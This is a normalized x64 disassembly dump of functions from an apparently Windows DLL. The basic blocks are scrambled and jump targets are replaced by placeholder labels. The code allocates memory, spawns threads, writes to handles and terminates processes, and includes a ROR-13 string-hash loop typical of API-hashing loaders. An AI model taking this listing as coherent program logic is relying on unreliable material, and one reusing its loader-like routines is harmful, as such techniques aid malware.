nop [ rax + rax ] eax
cmp [ rdi + 0x48 ] rsi
jne r-xdata
mov rax [ rbx ]
mov rcx [ rbx + 0x8 ]
mov [ rcx ] rax
mov rdx [ rbx ]
mov rax [ rbx + 0x8 ]
mov [ rdx + 0x8 ] rax
cmp [ rbx + 0x30 ] 0x10
jb r-xdata
mov rax [ rdi + 0x40 ]
mov rbx [ rax ]
cmp rbx rax
je r-xdata
mov rsi [ rsp + 0x30 ]
mov [ rbx + 0x30 ] 0xf
mov [ rbx + 0x28 ] rsi
mov rcx rbx
mov [ rbx + 0x18 ] sil
call j_sub_18002094c#2
dec [ rdi + 0x48 ]
mov rcx [ rbx + 0x18 ]
call j_sub_18002094c#2
sub_180012f50
mov rax rsp
push rdi
push r12
push r13
push r14
push r15
sub rsp 0xa0
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x90 ] rax
mov rdi rcx
mov [ rsp + 0x30 ] rcx
add rcx 0x8
call sub_18002022c
nop
lea rcx [ rdi + 0x40 ]
call sub_180011f10
nop
xor r13d r13d
mov [ rdi + 0x58 ] r13
mov [ rdi ] 0x32
lea ecx [ r13 + 0x30 ]
call sub_180021000
mov [ rsp + 0x20 ] rax
test rax rax
je r-xdata
mov rbp r13
mov rcx rax
call sub_180017520
mov rbp rax
jmp r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
lea rax [ rcx + 0x1 ]
mov [ rdi + 0x48 ] rax
mov [ rbx + 0x8 ] r11
mov rax [ r11 + 0x8 ]
mov [ rax ] r11
cmp [ rsp + 0x58 ] 0x10
jb r-xdata
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rbp
call sub_1800175a0
mov esi r13d
lea r15 [ rw-data ]
mov r14 0x555555555555554
nop [ rax ] eax
mov [ rsp + 0x58 ] 0xf
mov [ rsp + 0x50 ] r13
mov [ rsp + 0x40 ] 0x0
cmp [ rsp + 0x80 ] 0x10
jb r-xdata
mov rcx [ rsp + 0x40 ]
call j_sub_18002094c#2
inc esi
cmp esi 0x13
jb r-xdata
mov rcx [ rsp + 0x68 ]
call j_sub_18002094c#2
movsxd rbx esi
mov rdx rbx
imul rdx rdx 0x1e
add rdx r15
mov r8d 0x1e
mov rcx rbp
call sub_180017590
lea rdx [ rsp + 0x68 ]
mov rcx rbp
call sub_180017d20
nop
lea rcx [ rw-data ]
lea rdx [ rcx + rbx * 4 ]
mov r8 rax
lea rcx [ rsp + 0x38 ]
call sub_180012c20
nop
mov rbx [ rdi + 0x40 ]
mov rbx [ rbx ]
mov r9 rax
mov r8 [ rbx + 0x8 ]
mov rdx rbx
lea rcx [ rdi + 0x40 ]
call sub_180012d80
mov r11 rax
mov rcx [ rdi + 0x48 ]
mov rax r14
sub rax rcx
cmp rax 0x1
jb r-xdata
test rbp rbp
je r-xdata
movzx eax [ rdi ]
add eax 0x14
movsxd rdx eax
xor ecx ecx
lea r9d [ rcx + 0x4 ]
mov r8d 0x3000
call [ VirtualAlloc@IAT ]
mov [ rdi + 0x20 ] rax
test rax rax
je r-xdata
mov rcx rbp
call sub_180017560
mov rcx rbp
call j_sub_18002094c#2
mov rax rdi
jmp r-xdata
mov edx 0x104
xor ecx ecx
lea r9d [ rcx + 0x4 ]
mov r8d 0x3000
call [ VirtualAlloc@IAT ]
mov [ rdi + 0x10 ] rax
test rax rax
je r-xdata
mov rcx [ rsp + 0x90 ]
xor rcx rsp
call sub_1800212e0
lea r11 [ rsp + 0xa0 ]
mov rbx [ r11 + 0x38 ]
mov rbp [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov edx 0x118
xor ecx ecx
lea r9d [ rcx + 0x4 ]
mov r8d 0x3000
call [ VirtualAlloc@IAT ]
mov [ rdi + 0x18 ] rax
test rax rax
je r-xdata
mov ecx [ rw-data ]
mov edx 0x1
call sub_180021308
mov [ rdi + 0x28 ] rax
mov edx 0x1
mov ecx 0x104
call sub_180021308
mov [ rdi + 0x30 ] rax
mov edx 0x1
mov ecx 0x104
call sub_180021308
mov [ rdi + 0x38 ] rax
sub_1800131d0
mov rax rsp
push rbp
push rdi
push r12
lea rbp [ rax - 0x5f ]
sub rsp 0xc0
mov [ rbp - 0x51 ] 0xfffffffffffffffe
mov [ rax + 0x18 ] rbx
mov [ rax + 0x20 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x37 ] rax
mov rsi rcx
xor r12d r12d
mov ebx r12d
mov ecx r12d
movzx eax [ rdx ]
test ax ax
je r-xdata
mov [ rbp - 0x55 ] ebx
mov [ rbp - 0x31 ] 0x7
mov [ rbp - 0x39 ] r12
mov [ rbp - 0x49 ] r12w
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rdx
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rcx [ rbp - 0x49 ]
call sub_180003930
nop
lea rdx [ rbp - 0x49 ]
mov rdi [ rbp - 0x49 ]
mov rcx [ rbp - 0x31 ]
cmp rcx 0x8
cmovae rdx rdi
mov rax [ rbp - 0x39 ]
lea r8 [ rdx + rax * 2 ]
lea rdx [ rbp - 0x49 ]
cmovae rdx rdi
mov [ rbp - 0x9 ] 0xf
mov [ rbp - 0x11 ] r12
mov [ rbp - 0x21 ] 0x0
movzx r9d [ rbp - 0x59 ]
lea rcx [ rbp - 0x21 ]
call sub_18000de40
nop
test ebx ebx
jne r-xdata
nop [ rax + rax ] ax
lea rcx [ rsi + 0x8 ]
call sub_180020274
mov rcx [ rsi + 0x40 ]
mov rax [ rcx ]
mov [ rsi + 0x58 ] rax
cmp rax rcx
je r-xdata
cmp [ rbp - 0x9 ] 0x10
jb r-xdata
movzx eax ax
ror ebx 0xd
add ebx eax
inc rcx
movzx eax [ rdx + rcx * 2 ]
test ax ax
jne r-xdata
lea r8 [ rbp - 0x21 ]
lea rdx [ rbp - 0x55 ]
lea rcx [ rbp + 0x7 ]
call sub_180012b60
nop
mov rcx [ rsi + 0x40 ]
mov rbx [ rcx ]
mov r9 rax
mov r8 [ rbx + 0x8 ]
mov rdx rbx
lea rcx [ rsi + 0x40 ]
call sub_180012d80
mov r11 rax
mov rax [ rsi + 0x48 ]
mov rcx 0x555555555555554
sub rcx rax
cmp rcx 0x1
jae r-xdata
nop [ rax ] eax
cmp [ rbp - 0x31 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x21 ]
call j_sub_18002094c#2
nop
inc rax
mov [ rsi + 0x48 ] rax
mov [ rbx + 0x8 ] r11
mov rax [ r11 + 0x8 ]
mov [ rax ] r11
cmp [ rbp + 0x27 ] 0x10
jb r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
lea rcx [ rsi + 0x8 ]
call sub_18002027c
nop
cmp [ rbp - 0x9 ] 0x10
jb r-xdata
mov rcx [ rax ]
mov [ rsi + 0x58 ] rcx
cmp rcx [ rsi + 0x40 ]
jne r-xdata
xor al al
jmp r-xdata
mov rcx [ rbp - 0x49 ]
call j_sub_18002094c#2
lea rcx [ rsi + 0x8 ]
call sub_18002027c
nop
cmp [ rbp - 0x9 ] 0x10
jb r-xdata
mov rcx [ rbp + 0xf ]
call j_sub_18002094c#2
cmp [ rbp - 0x31 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x21 ]
call j_sub_18002094c#2
nop
mov rax [ rsi + 0x58 ]
cmp [ rax + 0x10 ] ebx
je r-xdata
jmp r-xdata
mov rcx [ rbp + 0x37 ]
xor rcx rsp
call sub_1800212e0
lea r11 [ rsp + 0xc0 ]
mov rbx [ r11 + 0x30 ]
mov rsi [ r11 + 0x38 ]
mov rsp r11
pop r12
pop rdi
pop rbp
retn
cmp [ rbp - 0x31 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x21 ]
call j_sub_18002094c#2
nop
mov rcx [ rbp - 0x49 ]
call j_sub_18002094c#2
xor al al
jmp r-xdata
mov al 0x1
mov rcx [ rbp - 0x49 ]
call j_sub_18002094c#2
sub_180013450
sub rsp 0x48
xor eax eax
test rdx rdx
je r-xdata
add rsp 0x48
retn
mov rax 0x1fffffffffffffff
cmp rdx rax
ja r-xdata
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x58 ] 0x0
call sub_180020424
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_1800210a4
int3
lea rcx [ rdx * 8 ]
call sub_180021000
test rax rax
jne r-xdata
sub_1800134e0
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x40
xor edi edi
mov rbx rcx
mov [ rcx ] rdi
lea ecx [ rdi + 0x10 ]
call sub_180021000
test rax rax
je r-xdata
lea rdx [ rsp + 0x50 ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x50 ] rdi
call sub_180020424
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_1800210a4
int3
mov [ rbx ] rax
mov [ rax ] rdi
mov [ rax + 0x8 ] rdi
mov rax [ rbx ]
mov [ rax ] rbx
mov [ rbx + 0x8 ] rdi
mov [ rbx + 0x10 ] rdi
mov [ rbx + 0x18 ] rdi
mov [ rbx + 0x20 ] rdi
mov rax rbx
mov rbx [ rsp + 0x58 ]
add rsp 0x40
pop rdi
retn
sub_180013560
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rax [ rcx + 0x20 ]
xor esi esi
mov rbx rcx
test rax rax
je r-xdata
mov rdi [ rcx + 0x10 ]
test rdi rdi
je r-xdata
nop [ rax ] eax
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x8 ]
dec rdi
cmp [ rcx + rdi * 8 ] rsi
je r-xdata
cmp [ rcx + 0x20 ] rsi
jne r-xdata
dec rax
mov [ rcx + 0x20 ] rax
jne r-xdata
mov [ rbx + 0x8 ] rsi
mov [ rbx + 0x10 ] rsi
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
call j_sub_18002094c#2
test rdi rdi
jne r-xdata
mov rcx [ rcx + rdi * 8 ]
call j_sub_18002094c#2
test rax rax
je r-xdata
mov [ rcx + 0x18 ] rsi
sub_180013620
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov rdi rcx
lea rax [ r--data ]
mov [ rcx ] rax
lea rax [ r--data ]
mov [ rcx + 0x10 ] rax
mov rbx [ rcx + 0x30 ]
test rbx rbx
je r-xdata
lea rcx [ rdi + 0x68 ]
call sub_180013560
mov rcx [ rdi + 0x68 ]
call j_sub_18002094c#2
mov [ rdi + 0x68 ] 0x0
lea rcx [ rdi + 0x38 ]
call sub_180013560
mov rcx [ rdi + 0x38 ]
call j_sub_18002094c#2
mov [ rdi + 0x38 ] 0x0
lea rax [ r--data ]
mov [ rdi ] rax
mov rbx [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
mov rcx rbx
call sub_180013fd0
mov rcx rbx
call j_sub_18002094c#2
nop
sub_1800136c0
push rdi
sub rsp 0x40
xor edi edi
cmp [ rcx + 0x88 ] rdi
je r-xdata
mov rax rdi
add rsp 0x40
pop rdi
retn
mov [ rsp + 0x50 ] rbx
lea rbx [ rcx + 0x68 ]
lea rdx [ rsp + 0x20 ]
mov rcx rbx
call sub_1800134c0
mov r8 rax
mov rax [ rax ]
test rax rax
jne r-xdata
mov rax [ rax ]
mov eax edi
jmp r-xdata
mov rax [ rax + 0x8 ]
mov rcx [ rax + rcx * 8 ]
mov rdx [ rcx + r8 * 8 ]
mov r8 [ rbx + 0x20 ]
test r8 r8
je r-xdata
sub rcx rdx
mov r8 [ r8 + 0x10 ]
mov rdx [ rax + 0x10 ]
mov rcx r8
and r8d 0x1
shr rcx 0x1
cmp rdx rcx
ja r-xdata
mov rax rdx
mov rbx [ rsp + 0x50 ]
add rsp 0x40
pop rdi
retn
inc [ rbx + 0x18 ]
mov rcx [ rbx + 0x18 ]
mov rax [ rbx + 0x10 ]
add rax rax
cmp rax rcx
lea rax [ r8 - 0x1 ]
cmovbe rcx rdi
mov [ rbx + 0x20 ] rax
test rax rax
mov rax rdx
mov [ rbx + 0x18 ] rcx
jne r-xdata
mov rbx [ rsp + 0x50 ]
add rsp 0x40
pop rdi
retn
mov [ rbx + 0x18 ] rdi
sub_180013780
push rdi
sub rsp 0x40
xor edi edi
cmp [ rcx + 0x48 ] rdi
je r-xdata
mov rax rdi
add rsp 0x40
pop rdi
retn
mov [ rsp + 0x50 ] rbx
lea rbx [ rcx + 0x28 ]
lea rdx [ rsp + 0x20 ]
mov rcx rbx
call sub_1800134c0
mov r8 rax
mov rax [ rax ]
test rax rax
jne r-xdata
mov rax [ rax ]
mov eax edi
jmp r-xdata
mov rax [ rax + 0x8 ]
mov rcx [ rax + rcx * 8 ]
mov rdx [ rcx + r8 * 8 ]
mov r8 [ rbx + 0x20 ]
test r8 r8
je r-xdata
sub rcx rdx
mov r8 [ r8 + 0x10 ]
mov rdx [ rax + 0x10 ]
mov rcx r8
and r8d 0x1
shr rcx 0x1
cmp rdx rcx
ja r-xdata
mov rax rdx
mov rbx [ rsp + 0x50 ]
add rsp 0x40
pop rdi
retn
inc [ rbx + 0x18 ]
mov rcx [ rbx + 0x18 ]
mov rax [ rbx + 0x10 ]
add rax rax
cmp rax rcx
lea rax [ r8 - 0x1 ]
cmovbe rcx rdi
mov [ rbx + 0x20 ] rax
test rax rax
mov rax rdx
mov [ rbx + 0x18 ] rcx
jne r-xdata
mov rbx [ rsp + 0x50 ]
add rsp 0x40
pop rdi
retn
mov [ rbx + 0x18 ] rdi
sub_180013840
test rdx rdx
je r-xdata
retn
mov [ rsp + 0x20 ] rbx
push rbp
sub rsp 0x20
mov rbx rdx
mov rbp rcx
mov [ rsp + 0x30 ] rsi
mov [ rsp + 0x40 ] rdi
mov rdi [ rdx + 0x10 ]
mov edx 0x1
mov rcx rdi
call sub_180021308
mov rsi rax
test rax rax
je r-xdata
cmp [ rbx + 0x18 ] 0x10
mov rdi [ rsp + 0x40 ]
mov rsi [ rsp + 0x30 ]
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] 0x0
mov rcx rbx
mov [ rbx ] 0x0
call j_sub_18002094c#2
mov rbx [ rsp + 0x48 ]
add rsp 0x20
pop rbp
mov rcx [ rbx ]
call j_sub_18002094c#2
mov rdx rbx
mov rdx [ rbx ]
jmp r-xdata
lea rcx [ rbp + 0x58 ]
lea rdx [ rsp + 0x38 ]
mov [ rsp + 0x38 ] rax
call sub_180001cd0
movzx ecx [ rw-data ]
mov [ rax + 0x6 ] 0x64
mov [ rax + 0x8 ] rsi
mov [ rax + 0x4 ] cx
movzx ecx [ rw-data ]
mov [ rax + 0x10 ] rdi
mov [ rax + 0x7 ] cl
mov [ rax ] 0x0
mov r8 rdi
mov rcx rax
call sub_1800205e0
mov ecx 0x18
call sub_180021000
test rax rax
je r-xdata
sub_180013920
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x58 ] rsi
mov rdi rcx
xor ebx ebx
mov [ rcx + 0x8 ] bx
mov [ rcx + 0x18 ] bl
mov [ rcx + 0x20 ] 0xffffffffffffffff
lea rax [ r--data ]
mov [ rcx ] rax
lea rax [ r--data ]
mov [ rcx + 0x10 ] rax
add rcx 0x38
lea rdx [ rsp + 0x48 ]
call sub_1800134e0
nop
lea rcx [ rdi + 0x68 ]
lea rdx [ rsp + 0x48 ]
call sub_1800134e0
nop
mov [ rdi + 0x28 ] rbx
movzx eax [ rw-data ]
mov [ rdi + 0x8 ] ax
lea ecx [ rbx + 0x78 ]
call sub_180021000
mov [ rsp + 0x48 ] rax
test rax rax
je r-xdata
mov [ rdi + 0x30 ] rbx
lea rdx [ rdi + 0x10 ]
mov rcx rbx
call sub_180013e60
nop
mov rax rdi
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
mov rcx rax
call sub_1800149f0
mov rbx rax
sub_1800139e0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov ebx edx
mov rdi rcx
call sub_180013620
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18002094c#2
sub_180013a10
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x40
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov r14 rdx
mov r13 rcx
mov rax [ rdx ]
test rax rax
jne r-xdata
movzx ebx [ rax + 0x6 ]
mov ecx 0x30
call sub_180021000
mov [ rsp + 0x90 ] rax
xor ebp ebp
test rax rax
je r-xdata
mov rbx [ rdx + 0x8 ]
test rbx rbx
je r-xdata
mov rdi rbp
mov rcx rax
call sub_180017520
mov rdi rax
jmp r-xdata
xor al al
jmp r-xdata
or eax 0xffffffff
[ rbx + 0x8 ] eax
dec eax
jne r-xdata
mov r9 [ r13 + 0x30 ]
mov rax [ r9 + 0x70 ]
cmp [ rax + 0x8 ] 0x0
jne r-xdata
dec r11d
je r-xdata
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rdi
call sub_1800175a0
movzx r11d bl
or rsi 0xffffffffffffffff
sub r11d 0x65
je r-xdata
add rsp 0x40
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
test rdi rdi
je r-xdata
mov [ rsp + 0x28 ] rbp
mov [ rsp + 0x20 ] ebp
lea r8 [ sub_180013400 ]
xor edx edx
xor ecx ecx
call [ CreateThread@IAT ]
mov [ r13 + 0x28 ] rax
mov ecx 0xbb8
call [ Sleep@IAT ]
mov r11 [ r13 + 0x30 ]
mov rax [ r11 + 0x70 ]
cmp [ rax + 0x8 ] 0x0
jne r-xdata
mov rax [ r13 + 0x30 ]
mov rbx [ rax + 0x70 ]
cmp [ rbx + 0x8 ] 0x0
je r-xdata
dec r11d
je r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x8 ]
mov rbx [ r14 + 0x8 ]
test rbx rbx
je r-xdata
mov rcx rdi
call sub_180017560
mov rcx rdi
call j_sub_18002094c#2
nop
mov r8d 0x1c
lea rdx [ rw-data ]
mov rcx rdi
call sub_180017590
mov ecx 0x28
call sub_180021000
mov [ rsp + 0x90 ] rax
test rax rax
je r-xdata
mov rbx [ rbx + 0x10 ]
cmp rbx 0xffffffffffffffff
je r-xdata
mov rax [ r13 + 0x30 ]
mov rcx [ rax + 0x70 ]
cmp [ rcx + 0x8 ] 0x0
je r-xdata
dec r11d
je r-xdata
mov al 0x1
mov eax esi
[ rbx + 0x8 ] eax
dec eax
jne r-xdata
lea rcx [ r13 + 0x10 ]
mov rax [ rcx ]
mov rdx rbp
call [ rax + 0x8 ]
mov rdx rax
mov rcx rdi
call sub_180017d20
mov rbp rax
mov rcx rdi
mov [ rsp + 0x90 ] ebp
lea rdx [ rsp + 0x90 ]
mov rcx rbx
call [ GetExitCodeProcess@IAT ]
mov edx [ rsp + 0x90 ]
mov rcx rbx
call [ TerminateProcess@IAT ]
test eax eax
setne al
mov rcx rdi
test al al
je r-xdata
mov rax [ r14 ]
mov r12 [ rax + 0x10 ]
mov ecx 0x28
call sub_180021000
mov rbx rax
mov [ rsp + 0x90 ] rax
test rax rax
je r-xdata
mov rax [ r13 + 0x30 ]
mov rcx [ rax + 0x70 ]
cmp [ rcx + 0x8 ] 0x0
mov rcx rdi
jne r-xdata
dec r11d
jne r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
jmp r-xdata
mov rdx rax
mov rcx rdi
call sub_180017d20
mov rbp rax
lea rdx [ rw-data ]
mov r8d 0x1b
mov r8d 0x14
lea rdx [ rw-data ]
jmp r-xdata
mov rbx rbp
mov rcx [ r14 ]
mov rdx [ rcx + 0x8 ]
mov [ rax + 0x18 ] 0xf
mov [ rax + 0x10 ] rbp
mov [ rax ] 0x0
mov r8 r12
mov rcx rax
call sub_180008110
jmp r-xdata
mov r8d 0x19
lea rdx [ rw-data ]
mov r8d 0x18
lea rdx [ rw-data ]
jmp r-xdata
mov rax [ r13 + 0x30 ]
mov rcx [ rax + 0x70 ]
cmp [ rcx + 0x8 ] r11b
je r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x8 ]
call sub_180017590
mov ecx 0x28
call sub_180021000
mov [ rsp + 0x98 ] rax
test rax rax
je r-xdata
lea r12 [ r8 + 0x1 ]
cmp r12 0xfffffffffffffffe
jbe r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
mov [ rsp + 0x98 ] rbx
mov r8 [ rbx + 0x10 ]
mov rax rsi
sub rax r8
cmp rax 0x1
ja r-xdata
jmp r-xdata
mov rdx rax
mov rcx rdi
call sub_180017d20
mov rbp rax
call sub_180017590
mov ecx 0x28
call sub_180021000
mov [ rsp + 0x90 ] rax
test rax rax
je r-xdata
lea r8d [ rsi + 0xc ]
lea rdx [ rw-data ]
mov rcx rdi
call sub_180017590
lea ecx [ rsi + 0x29 ]
call sub_180021000
mov [ rsp + 0x90 ] rax
test rax rax
je r-xdata
mov rax [ rbx + 0x18 ]
cmp rax r12
jae r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
mov rbx rbp
mov rdx rax
mov rcx rdi
call sub_180017d20
mov rbx rax
jmp r-xdata
test r12 r12
jne r-xdata
mov rdx r12
mov rcx rbx
call sub_180007580
jmp r-xdata
lea r12 [ r8 + 0x1 ]
cmp r12 0xfffffffffffffffe
jbe r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
mov [ rsp + 0x98 ] rbx
mov r8 [ rbx + 0x10 ]
mov rax rsi
sub rax r8
cmp rax 0x1
ja r-xdata
setne al
test al al
je r-xdata
mov [ rbx + 0x10 ] rbp
cmp rax 0x10
jb r-xdata
test r12 r12
lea rcx [ r--data ]
call sub_18001f6b8
lea rcx [ r13 + 0x38 ]
lea rdx [ rsp + 0x98 ]
call sub_180001cd0
jmp r-xdata
mov rcx [ rbx + 0x10 ]
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov [ rax ] 0x0
mov [ rbx + r12 ] 0x0
mov rbx [ rbx ]
mov [ rax + rcx ] 0xa
cmp [ rbx + 0x18 ] 0x10
mov [ rbx + 0x10 ] r12
jb r-xdata
sub_180013e70
sub rsp 0x48
cmp [ rcx + 0x70 ] 0x0
jne r-xdata
mov rcx [ rcx + 0x70 ]
mov rax [ rcx ]
add rsp 0x48
jmp [ rax + 0x8 ]
lea rax [ r--data ]
lea rdx [ rsp + 0x50 ]
lea rcx [ rsp + 0x20 ]
mov r8d 0x7
mov [ rsp + 0x50 ] rax
call sub_180020370
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
call sub_1800210a4
int3
sub_180013ec0
mov [ rsp + 0x18 ] rbx
push rsi
mov rbx r9
mov rsi rdx
mov r11 rcx
test r9 r9
jne r-xdata
mov r10 [ rcx + 0x10 ]
mov [ rsp + 0x10 ] rdi
mov [ rsp + 0x18 ] r12
or r12 0xffffffffffffffff
cmp r8 r10
jae r-xdata
cmp r8 [ rcx + 0x10 ]
ja r-xdata
mov rdi [ rsp + 0x10 ]
mov rax r12
mov r12 [ rsp + 0x18 ]
mov rbx [ rsp + 0x20 ]
pop rsi
retn
sub r10 r8
cmp rbx r10
ja r-xdata
mov rax r8
mov rbx [ rsp + 0x20 ]
pop rsi
retn
mov eax 0x1
sub rax rbx
add r10 rax
cmp [ rcx + 0x18 ] 0x8
jb r-xdata
mov rax rcx
mov rax [ rcx ]
jmp r-xdata
movzx ecx [ rsi ]
nop
lea rdi [ rax + r8 * 2 ]
test rdx rdx
je r-xdata
add rdx 0x2
dec rax
jne r-xdata
mov rcx rbx
mov r8 rsi
mov r9 rdx
test rbx rbx
je r-xdata
cmp [ rdx ] cx
je r-xdata
cmp [ r11 + 0x18 ] 0x8
jb r-xdata
movzx eax [ r8 ]
cmp [ r9 ] ax
jne r-xdata
mov rdi [ rsp + 0x10 ]
mov r12 [ rsp + 0x18 ]
mov rbx [ rsp + 0x20 ]
sub rdx r11
sar rdx 0x1
mov rax rdx
pop rsi
retn
mov r11 [ r11 ]
cmp [ r9 ] ax
mov ecx 0x1
cmovb ecx r12d
test ecx ecx
je r-xdata
add r9 0x2
add r8 0x2
dec rcx
jne r-xdata
mov rcx rdx
mov rax r12
sub rcx rdi
lea rdi [ rdx + 0x2 ]
sar rcx 0x1
sub rax rcx
add r10 rax
jmp r-xdata
mov rax r10
mov rdx rdi
test r10 r10
je r-xdata
sub_180013fd0
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
xor edi edi
mov rbx rcx
mov rcx [ rcx + 0x28 ]
mov [ rsp + 0x30 ] edi
test rcx rcx
je r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
lea rdx [ rsp + 0x30 ]
call [ GetExitCodeProcess@IAT ]
mov edx [ rsp + 0x30 ]
mov rcx [ rbx + 0x28 ]
call [ TerminateProcess@IAT ]
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rdi
mov [ rbx ] di
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rbx ]
call j_sub_18002094c#2
sub_180014030
mov rax rsp
push rdi
sub rsp 0x70
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ rax + 0x18 ] rbx
mov [ rax + 0x20 ] rsi
mov rdi rcx
xor esi esi
mov [ rax + 0x8 ] esi
mov rcx [ rdi + 0x70 ]
mov rax [ rcx ]
call [ rax ]
mov rbx rax
test rax rax
je r-xdata
lea rax [ r--data ]
mov [ rsp + 0x88 ] rax
mov r8d 0x6
lea rdx [ rsp + 0x88 ]
lea rcx [ rsp + 0x40 ]
call sub_180020370
lea rdx [ r--data ]
lea rcx [ rsp + 0x40 ]
call sub_1800210a4
mov ecx 0x32
call [ Sleep@IAT ]
jmp r-xdata
mov rax [ rax + 0x10 ]
test rax rax
je r-xdata
cmp [ rdi + 0x70 ] 0x0
jne r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov rdx rbx
mov rdx [ rbx ]
jmp r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
xor ecx ecx
call [ ExitThread@IAT ]
mov [ rsp + 0x20 ] rsi
lea r9 [ rsp + 0x80 ]
mov r8d eax
mov rcx [ rdi + 0x30 ]
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] rsi
mov [ rbx ] 0x0
mov rcx rbx
call j_sub_18002094c#2
mov rcx [ rbx ]
call j_sub_18002094c#2
sub_180014120
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push r12
sub rsp 0x30
mov rbp r9
mov rsi r8
mov r12 rdx
mov rbx rcx
test r8 r8
je r-xdata
mov r8 [ rbx + 0x10 ]
cmp r8 rdx
jae r-xdata
mov r10 [ rcx + 0x18 ]
cmp r10 0x8
jb r-xdata
or rax 0xffffffffffffffff
sub rax r8
cmp rax r9
ja r-xdata
lea rcx [ r--data ]
call sub_18001f714
mov rax rcx
mov rax [ rcx ]
jmp r-xdata
mov [ rsp + 0x40 ] rdi
test r9 r9
je r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
cmp r10 0x8
jb r-xdata
cmp r8 rax
jb r-xdata
mov rdi [ rsp + 0x40 ]
mov rax rbx
lea rdi [ r8 + r9 ]
mov rax 0x7ffffffffffffffe
cmp rdi rax
jbe r-xdata
mov rax [ rbx + 0x10 ]
lea rcx [ rcx + rax * 2 ]
cmp rcx r8
jbe r-xdata
mov rcx [ rcx ]
mov rcx [ rbx + 0x18 ]
cmp rcx rdi
jae r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
cmp r10 0x8
jb r-xdata
test rdi rdi
jne r-xdata
mov rdx rdi
mov rcx rbx
call sub_180001300
test rdi rdi
je r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov rax [ rbx + 0x18 ]
cmp rax 0x8
jb r-xdata
xor eax eax
mov [ rbx + 0x10 ] rax
cmp rcx 0x8
jb r-xdata
mov rbx [ rsp + 0x48 ]
mov rbp [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop r12
retn
sub rsi rax
mov [ rsp + 0x20 ] r9
mov r8 rbx
sar rsi 0x1
mov rcx rbx
mov r9 rsi
call sub_180007dd0
jmp r-xdata
mov rdx rbx
mov rdx [ rbx ]
jmp r-xdata
mov rcx rbx
mov [ rbx ] ax
jmp r-xdata
mov rcx [ rbx ]
mov [ rcx ] ax
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
cmp rax 0x8
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov r8 [ rbx + 0x10 ]
